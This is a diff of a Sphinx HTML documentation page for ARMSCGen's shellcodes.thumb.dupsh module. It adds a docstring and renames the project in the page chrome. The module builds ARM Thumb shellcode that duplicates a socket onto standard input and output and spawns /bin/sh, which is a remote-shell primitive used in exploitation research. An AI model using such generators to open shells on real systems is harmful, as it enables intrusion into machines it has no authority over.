@@ -1,3 +1,5 @@
+
+
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
@@ -6,7 +8,7 @@
   <head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
     
-    <title>shellcodes.thumb.dupsh &mdash; ..  documentation</title>
+    <title>shellcodes.thumb.dupsh &mdash; ARMSCGen  documentation</title>
     
     <link rel="stylesheet" href="../../../_static/default.css" type="text/css" />
     <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
@@ -23,7 +25,7 @@
     <script type="text/javascript" src="../../../_static/jquery.js"></script>
     <script type="text/javascript" src="../../../_static/underscore.js"></script>
     <script type="text/javascript" src="../../../_static/doctools.js"></script>
-    <link rel="top" title="..  documentation" href="../../../index.html" />
+    <link rel="top" title="ARMSCGen  documentation" href="../../../index.html" />
     <link rel="up" title="Module code" href="../../index.html" /> 
   </head>
   <body>
@@ -36,7 +38,7 @@
         <li class="right" >
           <a href="../../../py-modindex.html" title="Python Module Index"
              >modules</a> |</li>
-        <li><a href="../../../index.html">..  documentation</a> &raquo;</li>
+        <li><a href="../../../index.html">ARMSCGen  documentation</a> &raquo;</li>
           <li><a href="../../index.html" accesskey="U">Module code</a> &raquo;</li> 
       </ul>
     </div>  
@@ -47,12 +49,18 @@
           <div class="body">
             
   <h1>Source code for shellcodes.thumb.dupsh</h1><div class="highlight"><pre>
-<span class="c"># dupsh(sock, cmd)</span>
-
 <span class="kn">import</span> <span class="nn">dup</span>
 <span class="kn">import</span> <span class="nn">sh</span>
 
 <div class="viewcode-block" id="generate"><a class="viewcode-back" href="../../../shellcodes.thumb.html#shellcodes.thumb.dupsh.generate">[docs]</a><span class="k">def</span> <span class="nf">generate</span><span class="p">(</span><span class="n">sock</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">cmd</span><span class="o">=</span><span class="s">&#39;/bin/sh&#39;</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot;Duplicates sock to stdin, stdout and stderr and spawns a shell</span>
+
+<span class="sd">    Args:</span>
+<span class="sd">        sock(int/str/reg): sock descriptor</span>
+
+<span class="sd">        cmd(str): executes a cmd (default: /bin/sh)</span>
+
+<span class="sd">    &quot;&quot;&quot;</span>
     <span class="n">sc</span> <span class="o">=</span> <span class="n">dup</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
     <span class="n">sc</span> <span class="o">+=</span> <span class="n">sh</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">sc</span></div>
@@ -89,13 +97,13 @@
         <li class="right" >
           <a href="../../../py-modindex.html" title="Python Module Index"
              >modules</a> |</li>
-        <li><a href="../../../index.html">..  documentation</a> &raquo;</li>
+        <li><a href="../../../index.html">ARMSCGen  documentation</a> &raquo;</li>
           <li><a href="../../index.html" >Module code</a> &raquo;</li> 
       </ul>
     </div>
     <div class="footer">
-        &copy; Copyright 2014, Author.
-      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.2b1.
+        &copy; Copyright 2014, alex.park.
+      Created using <a href="http://sphinx.pocoo.org/">Sphinx</a> 1.1.3.
     </div>
   </body>
 </html>
